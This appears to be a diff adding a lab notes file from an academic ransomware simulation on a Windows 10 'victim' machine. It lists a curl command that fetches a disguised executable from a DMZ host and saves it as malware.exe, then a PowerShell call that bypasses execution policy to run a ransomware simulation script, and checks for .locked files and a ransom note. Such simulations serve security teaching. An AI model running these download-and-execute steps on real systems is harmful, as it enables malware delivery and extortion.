@@ -1,0 +1,12 @@
+# powershell_execution_commands.txt
+# Commands used on the Windows 10 victim machine during the project.
+
+# 1. Download the simulated malicious payload from DMZ:
+curl http://10.10.20.10:8080/invoice_update.exe -O malware.exe
+
+# 2. Run the simulated ransomware script:
+#    NOTE: This script is a NON-DESTRUCTIVE simulation used for academic purposes.
+powershell -ExecutionPolicy Bypass -File "C:\Users\Public\Documents\simulate_ransomware.ps1"
+
+# 3. Verify that the files in C:\Users\Public\Documents\critical were renamed to *.locked
+#    and that a ransom note README_RESTORE_FILES.txt was created.
